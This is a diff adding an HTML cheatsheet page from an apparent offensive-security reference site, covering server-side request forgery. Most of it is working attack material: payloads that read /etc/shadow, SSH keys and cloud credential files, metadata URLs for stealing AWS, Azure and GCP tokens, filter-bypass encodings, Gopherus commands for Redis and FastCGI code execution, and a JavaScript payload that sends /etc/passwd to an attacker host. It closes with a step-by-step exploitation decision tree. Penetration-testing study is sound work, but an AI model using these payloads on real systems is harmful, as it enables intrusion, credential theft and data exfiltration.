@@ -1,0 +1,223 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Cheatsheet · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../../index.html">Cheatsheets</a> › Web › Server-Side</nav><h1>Cheatsheet</h1><p class="cx-lede">Single-page SSRF reference - schemas, IP encodings, cloud metadata, gopher payloads, OOB.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1199, T1552.005</span><span class="cx-tag">D3FEND D3-MH, D3-NI, D3-OTF</span><span class="cx-tag">IMPACT InternalAccess, CloudMetadata</span></div><article class="cx-body"><h2 id="detection">Detection</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?url=http://&lt;COLLAB&gt;                   # OOB - confirms request reaches your host
+?url=file:///etc/passwd                # local file read
+?url=http://127.0.0.1:80               # localhost reachable
+?url=http://169.254.169.254/           # cloud metadata reachable</code></pre></figure>
+<h2 id="schemas">Schemas</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://, https://                      # standard
+file:///etc/passwd                     # local file read
+gopher://127.0.0.1:6379/_&lt;PAYLOAD&gt;     # protocol smuggling (curl-only)
+ftp://&lt;ATTACKER&gt;/                      # FTP fetch
+dict://127.0.0.1:11211/stats           # text protocols (Memcached)
+ldap://&lt;ATTACKER&gt;/                     # NTLM hash steal on Java/Windows
+php://filter/convert.base64-encode/resource=index.php   # PHP source disclosure
+data://text/plain,Hello                # inline data
+jar:http://&lt;ATTACKER&gt;/x.jar!/file      # Java classpath fetch</code></pre></figure>
+<h2 id="ip-encoding-bypass">IP encoding bypass</h2>
+<table>
+<thead>
+<tr>
+<th>Form</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>127.0.0.1</code></td>
+<td>Standard (the one usually filtered)</td>
+</tr>
+<tr>
+<td><code>127.1</code></td>
+<td>Short-form</td>
+</tr>
+<tr>
+<td><code>0.0.0.0</code></td>
+<td>Any-interface</td>
+</tr>
+<tr>
+<td><code>2130706433</code></td>
+<td>Decimal</td>
+</tr>
+<tr>
+<td><code>0x7f000001</code></td>
+<td>Hex</td>
+</tr>
+<tr>
+<td><code>017700000001</code></td>
+<td>Octal</td>
+</tr>
+<tr>
+<td><code>[::]</code></td>
+<td>IPv6 unspecified</td>
+</tr>
+<tr>
+<td><code>[::1]</code></td>
+<td>IPv6 loopback</td>
+</tr>
+<tr>
+<td><code>[::ffff:127.0.0.1]</code></td>
+<td>IPv4-mapped IPv6</td>
+</tr>
+<tr>
+<td><code>127.0.0.1.nip.io</code></td>
+<td>DNS resolves to 127.0.0.1</td>
+</tr>
+</tbody>
+</table>
+<p>Generate alternates:</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">import socket, struct
+ip = &quot;169.254.169.254&quot;
+n = struct.unpack(&quot;!I&quot;, socket.inet_aton(ip))[0]
+print(n, hex(n), oct(n))
+# 2852039166 0xa9fea9fe 0o25177724776</code></pre></figure>
+<h2 id="url-parser-confusion">URL parser confusion</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://example.com@127.0.0.1/         # @ split - host is 127.0.0.1
+http://127.0.0.1#example.com          # fragment - server-side ignores
+http://example.com/?next=http://127.0.0.1   # path/query smuggle
+http://example.com\@127.0.0.1/        # backslash (Java)
+http://example.com.evil.com/          # subdomain trick on substring filters</code></pre></figure>
+<h2 id="cloud-metadata">Cloud metadata</h2>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">AWS</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># IMDSv1 (legacy, no auth)
+?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;RoleName&gt;
+?url=http://169.254.169.254/latest/user-data/
+
+# IMDSv2 (token-based, requires PUT + header)
+?url=http://169.254.169.254/latest/api/token
+# Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
+# Method: PUT</code></pre></figure>
+<p>Use credentials:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">export AWS_ACCESS_KEY_ID=ASIA...
+export AWS_SECRET_ACCESS_KEY=...
+export AWS_SESSION_TOKEN=...
+aws sts get-caller-identity
+aws s3 ls</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Azure</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
+# Header required: Metadata: true
+
+?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https%3A%2F%2Fmanagement.azure.com
+# Header required: Metadata: true</code></pre></figure>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">TOKEN=&quot;&lt;access_token&gt;&quot;
+curl -H &quot;Authorization: Bearer $TOKEN&quot; &quot;https://management.azure.com/subscriptions?api-version=2020-01-01&quot;</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">GCP</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+# Header required: Metadata-Flavor: Google
+
+?url=http://metadata.google.internal/computeMetadata/v1/?recursive=true&amp;alt=json</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">K8s</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token
+?url=https://kubernetes.default.svc/api/v1/namespaces
+# Header: Authorization: Bearer &lt;TOKEN&gt;</code></pre></figure>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">kubectl --server=https://&lt;api&gt; --token=$TOKEN --insecure-skip-tls-verify get pods --all-namespaces</code></pre></figure>
+</div>
+</div>
+<h2 id="internal-port-scan">Internal port scan</h2>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># ffuf with length filter
+ffuf -w ports.txt:PORT -u &quot;http://&lt;TARGET&gt;/?url=http://127.0.0.1:PORT&quot; -fs 30
+
+# ffuf with regex filter (when length varies)
+ffuf -w ports.txt:PORT -u &quot;http://&lt;TARGET&gt;/?url=http://127.0.0.1:PORT&quot; -fr &#x27;Errno 111&#x27;
+
+# Quick port wordlist
+echo -e &quot;21\n22\n80\n443\n3306\n5000\n5432\n6379\n8009\n8080\n8443\n9090\n9200\n11211\n27017&quot; &gt; ports.txt</code></pre></figure>
+<p>Common internal hostnames:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>localhost, 127.0.0.1, 127.1, 0.0.0.0
+internal, internal.local, internal.app.local
+api, api.internal, admin, admin.internal
+host.docker.internal
+kubernetes.default.svc
+metadata, metadata.google.internal</code></pre></figure>
+<h2 id="gopher-protocol-smuggling">Gopher protocol smuggling</h2>
+<p>Use <a href="https://github.com/tarunkant/Gopherus">Gopherus</a>:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">git clone https://github.com/tarunkant/Gopherus
+python2 gopherus.py --exploit redis        # Redis → SSH key / cron / PHP shell
+python2 gopherus.py --exploit memcached    # Memcached store/retrieve
+python2 gopherus.py --exploit fastcgi      # PHP-FPM RCE
+python2 gopherus.py --exploit smtp         # internal SMTP send
+python2 gopherus.py --exploit mysql        # MySQL query as known user</code></pre></figure>
+<p>Output is a gopher URL - URL-encode once more for the SSRF parameter, submit.</p>
+<h2 id="local-file-targets">Local file targets</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code>file:///etc/passwd
+file:///etc/shadow                              # if root
+file:///proc/self/environ                       # env vars (best first read)
+file:///proc/self/cmdline                       # process args
+file:///proc/net/tcp                            # listening sockets
+file:///root/.aws/credentials
+file:///root/.ssh/id_rsa
+file:///app/.env                                # framework secrets
+file:///var/www/html/.env
+file:///app/config/database.yml</code></pre></figure>
+<h2 id="blind-ssrf-js-exfil-via-wkhtmltopdf">Blind SSRF - JS exfil via wkhtmltopdf</h2>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script&gt;
+var read = new XMLHttpRequest();
+var send = new XMLHttpRequest();
+read.onload = function() {
+    if (read.readyState === 4) {
+        send.open(&quot;GET&quot;, &quot;http://&lt;ATTACKER&gt;/?d=&quot; + btoa(read.responseText), true);
+        send.send();
+    }
+};
+read.open(&quot;GET&quot;, &quot;file:///etc/passwd&quot;, true);
+read.send();
+&lt;/script&gt;</code></pre></figure>
+<p>User-Agent in your callback contains <code>wkhtmltopdf</code> → JS execution available.</p>
+<h2 id="time-based-detection">Time-based detection</h2>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Reachable internal service - fast (~50ms)
+?url=http://127.0.0.1:80
+
+# Unreachable IP - slow (~10s timeout)
+?url=http://192.0.2.1                  # TEST-NET-1
+
+# Loop ports
+for p in 22 80 443 3306 6379; do
+    t=$(curl -s -o /dev/null -w &quot;%{time_total}&quot; &quot;http://&lt;TARGET&gt;/?url=http://127.0.0.1:$p&quot;)
+    echo &quot;$p: $t&quot;
+done</code></pre></figure>
+<h2 id="oob-listeners">OOB listeners</h2>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Burp Collaborator (Burp Pro)
+# Click &quot;Copy to clipboard&quot; - submit hostname
+
+# interactsh
+interactsh-client -v
+
+# Self-hosted
+sudo tcpdump -i any -n udp port 53      # DNS
+python3 -m http.server 80               # HTTP
+nc -lvnp 80                             # raw HTTP
+ngrok http 80                           # tunnel local server</code></pre></figure>
+<h2 id="multi-hop-encoding">Multi-hop encoding</h2>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># N hops = N levels of URL encoding
+echo -n &#x27;id; uname -a&#x27; | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri</code></pre></figure>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Bash function for repeated chained RCE
+function chain_rce() {
+    local cmd=&quot;$1&quot;
+    local enc=$(echo -n &quot;$cmd&quot; | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
+    curl -s &quot;http://&lt;TARGET&gt;/?url=http%3A%2F%2Fapp1.internal%2Fload%3Fq%3Dhttp%3A%3A%2F%2F%2F%2F127.0.0.1%3A5000%2Frunme%3Fx%3D${enc}&quot;
+}</code></pre></figure>
+<h2 id="quick-decision-tree">Quick decision tree</h2>
+<ol>
+<li><strong>Confirm SSRF</strong> - <code>?url=http://&lt;COLLAB&gt;</code> → check listener</li>
+<li><strong>Try <code>file://</code></strong> - <code>?url=file:///etc/passwd</code> → if works, dump source code first</li>
+<li><strong>Try cloud metadata</strong> - <code>?url=http://169.254.169.254/...</code> → if AWS, IAM creds in 2 requests</li>
+<li><strong>Internal port scan</strong> - ffuf with length/regex filter</li>
+<li><strong>Gopher to discovered services</strong> - Gopherus generates payloads</li>
+<li><strong>Filter blocks something?</strong> - IP alternates first, then <code>@</code>-split, then DNS rebinding</li>
+<li><strong>Output suppressed?</strong> - OOB callback; if PDF renderer, JS exfil</li>
+</ol></article><nav class="cx-pager"><a class="cx-prev" href="../../ssti/erb/index.html">Previous: ERB (Ruby - Rails, Sinatra, Puppet)</a><a class="cx-next" href="../../ssti/handlebars/index.html">Next: Handlebars (Node - Express, Ghost)</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../../license.html">License</a></p></footer>
+<script src="../../../../../codex.js"></script></body></html>
